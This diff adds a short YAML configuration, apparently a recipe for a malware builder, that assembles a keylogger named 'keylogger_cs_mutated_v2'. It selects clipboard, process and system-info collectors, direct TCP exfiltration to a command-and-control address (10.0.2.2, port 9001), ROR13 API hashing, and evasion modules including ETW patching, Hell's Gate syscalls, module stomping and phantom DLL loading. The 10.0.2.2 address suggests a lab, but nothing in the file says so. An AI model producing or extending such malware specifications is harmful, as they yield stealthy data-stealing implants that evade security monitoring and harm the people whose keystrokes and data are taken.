@@ -1,0 +1,24 @@
+name: keylogger_cs_mutated_v2
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info_api
+- collectors/processes
+- collectors/clipboard
+exfil: exfil/tcp_direct
+arch: arch/sequential
+resources: true
+api_resolve: api_resolve/api_hash_ror13
+evasion:
+- evasion/etw_patch
+- evasion/hells_gate
+- evasion/sleep_jitter
+- evasion/syscall_trampoline
+- evasion/module_stomp
+- evasion/phantom_dll
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
